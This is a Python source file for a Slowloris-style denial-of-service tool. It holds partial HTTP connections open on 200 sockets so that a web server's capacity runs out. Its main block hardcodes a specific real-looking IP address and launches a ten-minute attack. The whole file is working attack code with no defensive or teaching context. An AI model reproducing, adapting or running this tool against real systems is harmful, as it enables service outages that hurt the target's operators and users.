# Import dependencies
import socket
# import random
import time
import sys
import secrets


# Class definition
class pythonDOS():

    def __init__(self, ip: str, port=80, socketsCount=200):
        """ Class init function, initialize object, use default values on the initialize to keep it simple on production """
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    def newSocket(self):
        """ Function to create new sockets, each socket is a connection """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            s.send(getMessage("Get /?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            print("Error: "+str(se))
            time.sleep(0.5)
            return self.newSocket()

    def attack(self, timeout=sys.maxsize, sleep=15):
        """
        Attack function, sends all sockets (default 200) to target to
        change this value, modify __init__
        """
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for s in self._sockets:
                try:
                    print("Sending request #{}".format(str(i)))
                    s.send(getMessage("X-a: "))
                    i += 1
                except socket.error:
                    # If socket timeout or fail, remove and create a new one
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))


def getMessage(message: str):
    """ Create the message requested to target server """
    return (message + "{} HTTP/1.1\r\n".format(str(secrets.randbelow(2000)))).encode("utf-8")


# Main function
if __name__ == "__main__":
    # Create object with sockets
    dos = pythonDOS("216.239.32.21", 80, socketsCount=200)

    # Start attack to target server
    dos.attack(timeout=60*10)
